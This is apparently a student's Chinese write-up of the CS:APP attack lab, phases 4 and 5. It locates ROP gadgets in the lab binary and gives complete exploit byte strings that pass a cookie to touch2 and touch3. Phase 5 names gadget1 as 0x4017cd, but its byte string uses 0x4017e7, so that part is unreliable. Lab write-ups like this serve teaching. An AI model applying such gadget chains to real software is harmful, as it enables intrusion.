**前面的几个实验主要是填充代码，此处主要记录phase4和phase５**

需要注意**90代表no operations**

## phase4

使用ＲＯＰ攻击，不能使用固定的%rsp地址跳转

这里和phase２一样，是将cookie传递到touch２中，要解决的问题就是如何将cookie放到ｒｄｉ中

可以采用以下动作完成：

```assembly
popq %rax
movq %rax,%edi
ret
```

其中popq %rax字节码　５８　先去找到这个代码：

```assembly
0000000000401758 <addval_119>:
  401758:	8d 87 58 90 90 90    	lea    -0x6f6f6fa8(%rdi),%eax
  40175e:	c3  
```

所以找到**0x40175a**  此是**gadget1**

接下来寻找后续两句汇编的字节码　movq %rax,%edi 是48 89 c7 c3 ，所以找到

```assembly
000000000040177f <setval_382>:
  40177f:	c7 07 5c 48 89 c7    	movl   $0xc789485c,(%rdi)
  401785:	c3   
```

所以找到**0x401782**，此时**gadget2**

最后的代码应当由填充部分，gadget1的地址，cookie,gadget2的地址，touch2的地址组成

```code
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 //填充
5a 17 40 00 00 00 00 00 //gadget1
80 93 14 63 00 00 00 00 //cookie
82 17 40 00 00 00 00 00 //godget2
f6 15 40 00 00 00 00 00 //touch2
```

## phase5

将cookie传递到touch３，首先寻找和%rsp相关的代码

`movq %rsp, %rax`的对应４８　８９　ｅ０，找到

```assembly
00000000004017cb <addval_337>:
  4017cb:	8d 87 48 89 e0 91    	lea    -0x6e1f76b8(%rdi),%eax
  4017d1:	c3 
```

找到gadget1 ０x4017cd

接下来需要一个递增rax的来指向cookie

寻找`add $0x37,%al`　的代码 04 37

```assembly
0000000000401793 <add_xy>:
  401793:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  401797:	c3   
```

找到gadget2 ０x401795

接下来寻找`mov %rax, %rdi`的代码　４８　８９　ｃ7

```assembly
0000000000401771 <addval_358>:
  401771:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  401777:	c3 
```

找到gadget3 ０x401773

填充区２的计算是：从gadget２开始计算，一共申请了0x３７,用了3*8，剩下的需要填充，

```code
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 //0x18　填充
e7 17 40 00 00 00 00 00  //gadget1
95 17 40 00 00 00 00 00  //gadget2
73 17 40 00 00 00 00 00  //gadget3
ca 16 40 00 00 00 00 00  //touch3
dd dd dd dd dd dd dd dd dd dd dd dd dd dd dd dd
dd dd dd dd dd dd dd dd dd dd dd dd dd dd dd //０x37-3*8 = 31字节填充２
36 33 31 34 39 33 38 30 00　//cookie
```

